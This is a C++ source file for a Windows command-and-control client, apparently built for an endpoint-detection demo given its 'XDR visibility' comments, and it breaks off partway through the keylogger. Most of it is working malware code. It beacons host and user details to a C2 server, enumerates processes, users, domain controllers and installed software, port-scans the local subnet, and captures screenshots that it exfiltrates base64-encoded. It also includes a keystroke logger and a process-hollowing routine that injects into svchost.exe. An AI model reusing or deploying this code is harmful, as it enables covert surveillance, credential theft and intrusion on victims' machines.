// C2 Client Implementation
// This file contains the client-side implementation for the C&C communication

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <random>
#include <map>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")

// Include shared definitions from main file
extern std::string xorEncrypt(const std::string& data, const std::string& key);
extern void logActivity(const std::string& category, const std::string& type, const std::string& message);

// Include privilege escalation module
#include "privilege_escalation.cpp"

// Client configuration
#define CLIENT_BEACON_INTERVAL 10
#define CLIENT_RETRY_DELAY 10000
#define CLIENT_BUFFER_SIZE 4096

// C2 Packet structure (must match server)
#pragma pack(push, 1)
struct C2Packet {
    uint32_t signature;
    uint16_t version;
    uint16_t flags;
    uint32_t sessionId;
    uint16_t commandId;
    uint16_t sequenceNum;
    uint32_t payloadSize;
    uint32_t checksum;
};
#pragma pack(pop)

// Command types are defined in the main file, so we just include a comment here
// The CommandType enum is already defined in escapebox.cpp

class C2Client {
private:
    SOCKET serverSocket;
    std::string serverIP;
    int serverPort;
    bool connected;
    std::string clientId;
    std::mutex sendMutex;
    std::thread keyloggerThread;
    bool keyloggerActive;
    std::vector<std::string> keylogBuffer;
    std::mutex keylogMutex;
    bool autoElevate;
    
    // Client info
    std::string hostname;
    std::string username;
    std::string osVersion;
    bool isElevated;
    std::string machineGuid;
    
public:
    C2Client(const std::string& ip, int port, bool elevate = true) : 
        serverIP(ip), 
        serverPort(port), 
        connected(false), 
        serverSocket(INVALID_SOCKET),
        keyloggerActive(false),
        autoElevate(elevate) {
        gatherSystemInfo();
    }
    
    ~C2Client() {
        if (keyloggerActive) {
            keyloggerActive = false;
            if (keyloggerThread.joinable()) {
                keyloggerThread.join();
            }
        }
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
    }
    
    void gatherSystemInfo() {
        // Get hostname
        char hostBuffer[256];
        gethostname(hostBuffer, sizeof(hostBuffer));
        hostname = hostBuffer;
        
        // Get username
        char userBuffer[256];
        DWORD userSize = sizeof(userBuffer);
        GetUserNameA(userBuffer, &userSize);
        username = userBuffer;
        
        // Get OS version
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        
        // Use RtlGetVersion instead of GetVersionEx for accurate version
        typedef LONG (WINAPI *RtlGetVersionPtr)(OSVERSIONINFOEXA*);
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
            if (pRtlGetVersion) {
                pRtlGetVersion(&osvi);
            }
        }
        
        osVersion = "Windows " + std::to_string(osvi.dwMajorVersion) + "." + 
                    std::to_string(osvi.dwMinorVersion) + " Build " + 
                    std::to_string(osvi.dwBuildNumber);
        
        // Check if elevated
        HANDLE hToken;
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        isElevated = false;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
                isElevated = elevation.TokenIsElevated != 0;
            }
            CloseHandle(hToken);
        }
        
        // Generate machine GUID
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        const char* hex = "0123456789ABCDEF";
        machineGuid = "";
        for (int i = 0; i < 32; i++) {
            machineGuid += hex[dis(gen)];
            if (i == 7 || i == 11 || i == 15 || i == 19) {
                machineGuid += "-";
            }
        }
    }
    
    bool connectToServer() {
        serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (serverSocket == INVALID_SOCKET) {
            return false;
        }
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(serverPort);
        inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);
        
        if (connect(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            int error = WSAGetLastError();
            std::cout << "[-] Connection failed with error: " << error;
            switch(error) {
                case WSAECONNREFUSED:
                    std::cout << " (Connection refused - server may not be running or port is closed)" << std::endl;
                    break;
                case WSAETIMEDOUT:
                    std::cout << " (Connection timed out - server may be unreachable)" << std::endl;
                    break;
                case WSAENETUNREACH:
                    std::cout << " (Network unreachable)" << std::endl;
                    break;
                case WSAEACCES:
                    std::cout << " (Permission denied - firewall may be blocking)" << std::endl;
                    break;
                default:
                    std::cout << std::endl;
            }
            closesocket(serverSocket);
            serverSocket = INVALID_SOCKET;
            return false;
        }
        
        connected = true;
        
        // Receive handshake
        char buffer[1024];
        int bytes = recv(serverSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            std::string handshake = xorEncrypt(std::string(buffer, bytes), "PaloAltoEscapeRoom");
            
            // Parse client ID from handshake
            size_t idPos = handshake.find("ID:");
            if (idPos != std::string::npos) {
                clientId = handshake.substr(idPos + 3);
                size_t endPos = clientId.find('\n');
                if (endPos != std::string::npos) {
                    clientId = clientId.substr(0, endPos);
                }
            }
        }
        
        // Send client info
        std::string clientInfo = hostname + "|" + username + "|" + osVersion + "|" + 
                               (isElevated ? "ADMIN" : "USER") + "|" + machineGuid;
        sendData(clientInfo);
        
        return true;
    }
    
    void sendData(const std::string& data) {
        std::lock_guard<std::mutex> lock(sendMutex);
        std::string encrypted = xorEncrypt(data, "PaloAltoEscapeRoom");
        int bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
        logActivity("CLIENT_DEBUG", "DATA_SENT", "Sent " + std::to_string(bytesSent) + " encrypted bytes to server (original: " + std::to_string(data.length()) + " bytes)");
    }
    
    void sendResponse(const std::string& response) {
        logActivity("CLIENT_DEBUG", "SENDING_RESPONSE", "Sending response: " + response + " (Length: " + std::to_string(response.length()) + ")");
        sendData(response);
    }
    
    // Command execution functions
    void executeSystemInfo() {
        std::stringstream sysInfo;
        sysInfo << "SYSINFO:START\n";
        
        // Computer name
        sysInfo << "Computer: " << hostname << "\n";
        sysInfo << "User: " << username << "\n";
        sysInfo << "OS: " << osVersion << "\n";
        sysInfo << "Privileges: " << (isElevated ? "Administrator" : "User") << "\n";
        
        // CPU info
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        sysInfo << "Processors: " << si.dwNumberOfProcessors << "\n";
        sysInfo << "Architecture: ";
        switch (si.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64:
                sysInfo << "x64\n";
                break;
            case PROCESSOR_ARCHITECTURE_INTEL:
                sysInfo << "x86\n";
                break;
            default:
                sysInfo << "Unknown\n";
        }
        
        // Memory info
        MEMORYSTATUSEX ms;
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        sysInfo << "Total Memory: " << (ms.ullTotalPhys / (1024 * 1024)) << " MB\n";
        sysInfo << "Available Memory: " << (ms.ullAvailPhys / (1024 * 1024)) << " MB\n";
        
        // System uptime
        DWORD tickCount = GetTickCount();
        DWORD days = tickCount / (24 * 60 * 60 * 1000);
        DWORD hours = (tickCount / (60 * 60 * 1000)) % 24;
        DWORD minutes = (tickCount / (60 * 1000)) % 60;
        sysInfo << "Uptime: " << days << " days, " << hours << " hours, " << minutes << " minutes\n";
        
        sysInfo << "SYSINFO:END";
        sendResponse(sysInfo.str());
    }
    
    void executeProcessList() {
        std::stringstream procList;
        procList << "PROCLIST:START\n";
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    // Get process owner
                    std::string owner = "N/A";
                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        HANDLE hToken;
                        if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                            DWORD dwSize = 0;
                            GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
                            if (dwSize > 0) {
                                PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
                                if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
                                    char userName[256], domainName[256];
                                    DWORD userNameSize = sizeof(userName);
                                    DWORD domainNameSize = sizeof(domainName);
                                    SID_NAME_USE sidType;
                                    if (LookupAccountSidA(NULL, pTokenUser->User.Sid, userName, 
                                                         &userNameSize, domainName, &domainNameSize, &sidType)) {
                                        owner = std::string(domainName) + "\\" + userName;
                                    }
                                }
                                free(pTokenUser);
                            }
                            CloseHandle(hToken);
                        }
                        CloseHandle(hProcess);
                    }
                    
                    procList << pe32.th32ProcessID << "\t" 
                            << pe32.szExeFile << "\t" 
                            << pe32.th32ParentProcessID << "\t"
                            << owner << "\n";
                            
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
        
        procList << "PROCLIST:END";
        sendResponse(procList.str());
    }
    
    void executeNetworkConfig() {
        std::stringstream netConfig;
        netConfig << "NETCONFIG:START\n";
        
        // Execute ipconfig and capture output
        FILE* pipe = _popen("ipconfig /all", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                netConfig << buffer;
            }
            _pclose(pipe);
        }
        
        // Add netstat info
        netConfig << "\n=== Active Connections ===\n";
        pipe = _popen("netstat -an", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                netConfig << buffer;
            }
            _pclose(pipe);
        }
        
        netConfig << "NETCONFIG:END";
        sendResponse(netConfig.str());
    }
    
    void executeUserEnum() {
        std::stringstream userList;
        userList << "USERLIST:START\n";
        
        // Local users
        userList << "=== Local Users ===\n";
        FILE* pipe = _popen("net user", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                userList << buffer;
            }
            _pclose(pipe);
        }
        
        // Local groups
        userList << "\n=== Local Groups ===\n";
        pipe = _popen("net localgroup", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                userList << buffer;
            }
            _pclose(pipe);
        }
        
        // Administrator group members
        userList << "\n=== Administrators ===\n";
        pipe = _popen("net localgroup administrators", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                userList << buffer;
            }
            _pclose(pipe);
        }
        
        userList << "USERLIST:END";
        sendResponse(userList.str());
    }
    
    void executeDomainInfo() {
        std::stringstream domainInfo;
        domainInfo << "DOMAIN:START\n";
        
        // Check if domain joined
        FILE* pipe = _popen("wmic computersystem get domain", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                domainInfo << buffer;
            }
            _pclose(pipe);
        }
        
        // Domain controllers
        pipe = _popen("nltest /dclist:", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                domainInfo << buffer;
            }
            _pclose(pipe);
        }
        
        domainInfo << "DOMAIN:END";
        sendResponse(domainInfo.str());
    }
    
    void executeSoftwareEnum() {
        std::stringstream softList;
        softList << "SOFTWARE:START\n";
        
        // Enumerate installed software from registry
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            char subKeyName[256];
            DWORD subKeyNameSize;
            DWORD index = 0;
            
            while (RegEnumKeyExA(hKey, index++, subKeyName, &(subKeyNameSize = sizeof(subKeyName)), 
                                NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                HKEY hSubKey;
                if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char displayName[256] = {0};
                    char version[256] = {0};
                    DWORD size = sizeof(displayName);
                    
                    RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (BYTE*)displayName, &size);
                    size = sizeof(version);
                    RegQueryValueExA(hSubKey, "DisplayVersion", NULL, NULL, (BYTE*)version, &size);
                    
                    if (strlen(displayName) > 0) {
                        softList << displayName << " - " << version << "\n";
                    }
                    
                    RegCloseKey(hSubKey);
                }
            }
            RegCloseKey(hKey);
        }
        
        softList << "SOFTWARE:END";
        sendResponse(softList.str());
    }
    
    void executeProcessHollow() {
        sendResponse("PROCESS_HOLLOW:STARTING");
        
        // Process hollowing is a technique where we:
        // 1. Create a legitimate process in suspended state
        // 2. Hollow out its memory
        // 3. Replace it with malicious code
        
        // Target process (use svchost.exe as it's common)
        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        std::string targetPath = std::string(systemPath) + "\\svchost.exe";
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        // Create process in suspended state
        if (CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE, 
                          CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            sendResponse("PROCESS_HOLLOW:CREATED:" + std::to_string(pi.dwProcessId));
            
            // Get thread context
            CONTEXT ctx;
            ctx.ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(pi.hThread, &ctx)) {
                
                // Read PEB address
                PVOID pebAddress;
                SIZE_T bytesRead;
                
                #ifdef _WIN64
                    pebAddress = (PVOID)ctx.Rdx;
                #else
                    pebAddress = (PVOID)ctx.Ebx;
                #endif
                
                // Read image base address from PEB
                PVOID imageBase = nullptr;
                if (ReadProcessMemory(pi.hProcess, (LPBYTE)pebAddress + 8, 
                                    &imageBase, sizeof(PVOID), &bytesRead)) {
                    
                    sendResponse("PROCESS_HOLLOW:PEB_READ:SUCCESS");
                    
                    // In a real attack, we would:
                    // 1. Unmap the original executable
                    // 2. Allocate new memory
                    // 3. Write our malicious PE
                    // 4. Update entry point
                    // 5. Resume thread
                    
                    // For demonstration, we'll just show the technique
                    sendResponse("PROCESS_HOLLOW:HOLLOWING:ImageBase=" + 
                               std::to_string((DWORD_PTR)imageBase));
                    
                    // Allocate memory in target process
                    SIZE_T shellcodeSize = 4096;
                    LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                                       MEM_COMMIT | MEM_RESERVE, 
                                                       PAGE_EXECUTE_READWRITE);
                    
                    if (remoteBuffer) {
                        sendResponse("PROCESS_HOLLOW:ALLOCATED:" + 
                                   std::to_string((DWORD_PTR)remoteBuffer));
                        
                        // Example shellcode (real implementation would use actual payload)
                        unsigned char shellcode[] = {
                            0x90, 0x90, 0x90, 0x90,  // NOP sled
                            0xC3                      // RET
                        };
                        
                        // Write shellcode
                        SIZE_T bytesWritten;
                        if (WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, 
                                             sizeof(shellcode), &bytesWritten)) {
                            sendResponse("PROCESS_HOLLOW:INJECTED:SUCCESS");
                            
                            // Update thread context to point to our code
                            #ifdef _WIN64
                                ctx.Rcx = (DWORD64)remoteBuffer;
                            #else
                                ctx.Eax = (DWORD)remoteBuffer;
                            #endif
                            
                            SetThreadContext(pi.hThread, &ctx);
                        }
                        
                        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
                    }
                }
            }
            
            // Resume the thread (in real attack, this would execute our code)
            ResumeThread(pi.hThread);
            
            // For safety, terminate the process after demonstration
            Sleep(100);
            TerminateProcess(pi.hProcess, 0);
            
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            
            sendResponse("PROCESS_HOLLOW:COMPLETE");
        } else {
            sendResponse("PROCESS_HOLLOW:FAILED:" + std::to_string(GetLastError()));
        }
    }
    
    void executePortScan() {
        sendResponse("PORTSCAN:STARTING");
        
        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            sendResponse("PORTSCAN:FAILED:WSA_INIT");
            return;
        }
        
        // Common ports to scan
        std::vector<int> commonPorts = {
            21,    // FTP
            22,    // SSH
            23,    // Telnet
            25,    // SMTP
            53,    // DNS
            80,    // HTTP
            110,   // POP3
            135,   // RPC
            139,   // NetBIOS
            143,   // IMAP
            443,   // HTTPS
            445,   // SMB
            1433,  // MSSQL
            1521,  // Oracle
            3306,  // MySQL
            3389,  // RDP
            5432,  // PostgreSQL
            5900,  // VNC
            8080,  // HTTP Alt
            8443   // HTTPS Alt
        };
        
        // Get local subnet
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        struct hostent* host = gethostbyname(hostname);
        
        if (host && host->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
            std::string localIP = inet_ntoa(addr);
            
            // Extract subnet (assuming /24)
            std::string subnet = localIP.substr(0, localIP.rfind('.')) + ".";
            
            sendResponse("PORTSCAN:SUBNET:" + subnet + "0/24");
            
            // Scan a few hosts on the local network
            for (int host = 1; host <= 10; host++) {
                std::string targetIP = subnet + std::to_string(host);
                std::stringstream openPorts;
                openPorts << "PORTSCAN:HOST:" << targetIP << ":PORTS:";
                
                bool foundOpen = false;
                
                for (int port : commonPorts) {
                    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (sock != INVALID_SOCKET) {
                        // Set socket to non-blocking mode
                        u_long mode = 1;
                        ioctlsocket(sock, FIONBIO, &mode);
                        
                        sockaddr_in target;
                        target.sin_family = AF_INET;
                        target.sin_port = htons(port);
                        target.sin_addr.s_addr = inet_addr(targetIP.c_str());
                        
                        // Attempt connection
                        connect(sock, (sockaddr*)&target, sizeof(target));
                        
                        // Wait for connection with timeout
                        fd_set fdset;
                        FD_ZERO(&fdset);
                        FD_SET(sock, &fdset);
                        
                        timeval tv;
                        tv.tv_sec = 0;
                        tv.tv_usec = 50000; // 50ms timeout
                        
                        if (select(0, NULL, &fdset, NULL, &tv) > 0) {
                            // Port is open
                            if (foundOpen) openPorts << ",";
                            openPorts << port;
                            foundOpen = true;
                            
                            // Try to grab banner
                            char banner[256] = {0};
                            recv(sock, banner, sizeof(banner) - 1, 0);
                            if (strlen(banner) > 0) {
                                // Clean up banner
                                for (int i = 0; i < strlen(banner); i++) {
                                    if (banner[i] == '\r' || banner[i] == '\n') {
                                        banner[i] = ' ';
                                    }
                                }
                                sendResponse("PORTSCAN:BANNER:" + targetIP + ":" + 
                                           std::to_string(port) + ":" + std::string(banner));
                            }
                        }
                        
                        closesocket(sock);
                    }
                }
                
                if (foundOpen) {
                    sendResponse(openPorts.str());
                }
            }
            
            // Also scan external common targets
            std::vector<std::string> externalTargets = {
                "8.8.8.8",        // Google DNS
                "1.1.1.1",        // Cloudflare DNS
                serverIP          // C2 server
            };
            
            for (const auto& target : externalTargets) {
                std::stringstream result;
                result << "PORTSCAN:EXTERNAL:" << target << ":";
                
                // Quick scan of common ports
                SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (sock != INVALID_SOCKET) {
                    u_long mode = 1;
                    ioctlsocket(sock, FIONBIO, &mode);
                    
                    sockaddr_in addr;
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(443); // HTTPS
                    addr.sin_addr.s_addr = inet_addr(target.c_str());
                    
                    connect(sock, (sockaddr*)&addr, sizeof(addr));
                    
                    fd_set fdset;
                    FD_ZERO(&fdset);
                    FD_SET(sock, &fdset);
                    
                    timeval tv;
                    tv.tv_sec = 1;
                    tv.tv_usec = 0;
                    
                    if (select(0, NULL, &fdset, NULL, &tv) > 0) {
                        result << "443:OPEN";
                    } else {
                        result << "FILTERED";
                    }
                    
                    closesocket(sock);
                }
                
                sendResponse(result.str());
            }
        }
        
        WSACleanup();
        sendResponse("PORTSCAN:COMPLETE");
    }
    
    void executeScreenshot() {
        logActivity("CLIENT_DEBUG", "SCREENSHOT_START", "Beginning screenshot capture process");
        sendResponse("SCREENSHOT:CAPTURING");
        
        // Get screen dimensions
        int screenX = GetSystemMetrics(SM_CXSCREEN);
        int screenY = GetSystemMetrics(SM_CYSCREEN);
        logActivity("CLIENT_DEBUG", "SCREENSHOT_DIMENSIONS", "Screen size: " + std::to_string(screenX) + "x" + std::to_string(screenY));
        
        // Create bitmap
        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenX, screenY);
        HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
        logActivity("CLIENT_DEBUG", "SCREENSHOT_BITMAP", "Created bitmap and device contexts");
        
        // Copy screen
        BOOL copyResult = BitBlt(hDC, 0, 0, screenX, screenY, hScreen, 0, 0, SRCCOPY);
        logActivity("CLIENT_DEBUG", "SCREENSHOT_CAPTURE", "Screen copy result: " + std::string(copyResult ? "SUCCESS" : "FAILED"));
        
        // Generate filename
        std::string filename = "C:\\Windows\\Temp\\screenshot_" + 
                              std::to_string(GetTickCount()) + ".bmp";
        logActivity("CLIENT_DEBUG", "SCREENSHOT_FILENAME", "Generated filename: " + filename);
        
        // Save bitmap (simplified version)
        BITMAPFILEHEADER bfHeader;
        BITMAPINFOHEADER biHeader;
        BITMAPINFO bInfo;
        HGDIOBJ hOldBitmap;
        HDC hMemDC;
        BITMAP bmp;
        PBITMAPINFO pbmi;
        WORD cClrBits;
        
        GetObject(hBitmap, sizeof(BITMAP), &bmp);
        
        cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
        if (cClrBits == 1) cClrBits = 1;
        else if (cClrBits <= 4) cClrBits = 4;
        else if (cClrBits <= 8) cClrBits = 8;
        else if (cClrBits <= 16) cClrBits = 16;
        else if (cClrBits <= 24) cClrBits = 24;
        else cClrBits = 32;
        
        if (cClrBits < 24) {
            pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + 
                                          sizeof(RGBQUAD) * (1 << cClrBits));
        } else {
            pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));
        }
        
        pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        pbmi->bmiHeader.biWidth = bmp.bmWidth;
        pbmi->bmiHeader.biHeight = bmp.bmHeight;
        pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
        pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
        pbmi->bmiHeader.biCompression = BI_RGB;
        pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8 
                                     * pbmi->bmiHeader.biHeight;
        pbmi->bmiHeader.biClrImportant = 0;
        
        HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, 
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            bfHeader.bfType = 0x4D42; // "BM"
            bfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + 
                             pbmi->bmiHeader.biSizeImage;
            bfHeader.bfReserved1 = 0;
            bfHeader.bfReserved2 = 0;
            bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
            
            DWORD dwWritten;
            WriteFile(hFile, &bfHeader, sizeof(bfHeader), &dwWritten, NULL);
            WriteFile(hFile, &pbmi->bmiHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
            
            // Write bitmap data
            BYTE* lpBits = (BYTE*)GlobalAlloc(GMEM_FIXED, pbmi->bmiHeader.biSizeImage);
            GetDIBits(hDC, hBitmap, 0, pbmi->bmiHeader.biHeight, lpBits, pbmi, DIB_RGB_COLORS);
            WriteFile(hFile, lpBits, pbmi->bmiHeader.biSizeImage, &dwWritten, NULL);
            
            GlobalFree(lpBits);
            CloseHandle(hFile);
        }
        
        LocalFree(pbmi);
        
        // Cleanup
        SelectObject(hDC, old_obj);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        DeleteObject(hBitmap);
        
        // Log file activity for XDR
        logActivity("COLLECTION", "SCREENSHOT", "Screenshot saved to " + filename);
        
        // Also save to user's Pictures folder for more XDR visibility
        char picturesPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_MYPICTURES, NULL, SHGFP_TYPE_CURRENT, picturesPath) == S_OK) {
            std::string picturesCopy = std::string(picturesPath) + "\\capture_" + 
                                     std::to_string(GetTickCount()) + ".bmp";
            if (CopyFileA(filename.c_str(), picturesCopy.c_str(), FALSE)) {
                logActivity("COLLECTION", "SCREENSHOT_COPY", "Screenshot copied to " + picturesCopy);
            }
        }
        
        // Create additional metadata file
        std::string metaFile = filename + ".meta";
        std::ofstream meta(metaFile);
        if (meta.is_open()) {
            meta << "Screenshot Metadata" << std::endl;
            meta << "Timestamp: " << std::time(nullptr) << std::endl;
            meta << "Resolution: " << screenX << "x" << screenY << std::endl;
            meta << "Machine: " << hostname << std::endl;
            meta << "User: " << username << std::endl;
            meta.close();
            logActivity("COLLECTION", "SCREENSHOT_META", "Metadata saved to " + metaFile);
        }
        
        // Send the actual screenshot data to server
        std::ifstream bmpFile(filename, std::ios::binary);
        if (bmpFile.is_open()) {
            // Read the BMP file
            bmpFile.seekg(0, std::ios::end);
            size_t fileSize = bmpFile.tellg();
            bmpFile.seekg(0, std::ios::beg);
            
            std::vector<char> bmpData(fileSize);
            bmpFile.read(bmpData.data(), fileSize);
            bmpFile.close();
            
            // Base64 encode the screenshot
            std::string encodedScreenshot = base64_encode(std::string(bmpData.begin(), bmpData.end()));
            
            // Send to server with metadata
            std::stringstream response;
            response << "SCREENSHOT:DATA:START\n";
            response << "Resolution:" << screenX << "x" << screenY << "\n";
            response << "Timestamp:" << std::time(nullptr) << "\n";
            response << "Filename:" << filename << "\n";
            response << "Data:" << encodedScreenshot << "\n";
            response << "SCREENSHOT:DATA:END";
            
            sendResponse(response.str());
            logActivity("EXFIL", "SCREENSHOT_SENT", "Screenshot data sent to C2 server");
        } else {
            sendResponse("SCREENSHOT:ERROR:Failed to read screenshot file");
        }
    }
    
    void keyloggerWorker() {
        // Add timestamp and window title tracking
        std::string lastWindowTitle = "";
        logActivity("KEYLOG", "WORKER_START", "Keylogger worker thread started");
        
        while (keyloggerActive) {
            // Get current window title
            char windowTitle[256];
            HWND foreground = GetForegroundWindow();
            if (foreground) {
                GetWindowTextA(foreground, windowTitle, sizeof(windowTitle));
                std::string currentTitle = windowTitle;
                
                if (currentTitle != lastWindowTitle && !currentTitle.empty()) {
                    lastWindowTitle = currentTitle;
                    std::lock_guard<std::mutex> lock(keylogMutex);
                    
                    // Add timestamp and window info
                    SYSTEMTIME st;
                    GetLocalTime(&st);
                    char timeStr[100];
                    sprintf_s(timeStr, "\n[%02d:%02d:%02d - Window: %s]\n", 
                             st.wHour, st.wMinute, st.wSecond, windowTitle);
                    keylogBuffer.push_back(timeStr);
                }
            }
            
            // Check all keys
            for (int key = 8; key <= 255; key++) {
                SHORT keyState = GetAsyncKeyState(key);
                if (keyState & 0x0001) {  // Key was pressed
                    std::string keyStr;
                    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
                    
                    // Special keys
                    switch (key) {
                        case VK_BACK: keyStr = "[BACKSPACE]"; break;
                        case VK_RETURN: keyStr = "\n"; break;
                        case VK_SHIFT: continue; // Don't log shift by itself
                        case VK_CONTROL: continue; // Don't log ctrl by itself
                        case VK_MENU: keyStr = "[ALT]"; break;
                        case VK_CAPITAL: keyStr = "[CAPS]"; break;
                        case VK_ESCAPE: keyStr = "[ESC]"; break;
                        case VK_SPACE: keyStr = " "; break;
                        case VK_TAB: keyStr = "\t"; break;
                        case VK_LEFT: keyStr = "[LEFT]"; break;
                        case VK_RIGHT: keyStr = "[RIGHT]"; break;
                        case VK_UP: keyStr = "[UP]"; break;
                        case VK_DOWN: keyStr = "[DOWN]"; break;
                        case VK_DELETE: keyStr = "[DELETE]"; break;
                        case VK_PRIOR: keyStr = "[PAGEUP]"; break;
                        case VK_NEXT: keyStr = "[PAGEDOWN]"; break;
                        case VK_HOME: keyStr = "[HOME]"; break;
                        case VK_END: keyStr = "[END]"; break;
                        case VK_F1: keyStr = "[F1]"; break;
                        case VK_F2: keyStr = "[F2]"; break;
                        case VK_F3: keyStr = "[F3]"; break;
                        case VK_F4: keyStr = "[F4]"; break;
                        case VK_F5: keyStr = "[F5]"; break;
                        case VK_F6: keyStr = "[F6]"; break;
                        case VK_F7: keyStr = "[F7]"; break;
                        case VK_F8: keyStr = "[F8]"; break;
                        case VK_F9: keyStr = "[F9]"; break;
                        case VK_F10: keyStr = "[F10]"; break;
                        case VK_F11: keyStr = "[F11]"; break;
                        case VK_F12: keyStr = "[F12]"; break;
                        case VK_NUMPAD0: keyStr = "0"; break;
                        case VK_NUMPAD1: keyStr = "1"; break;
                        case VK_NUMPAD2: keyStr = "2"; break;
                        case VK_NUMPAD3: keyStr = "3"; break;
                        case VK_NUMPAD4: keyStr = "4"; break;
                        case VK_NUMPAD5: keyStr = "5"; break;
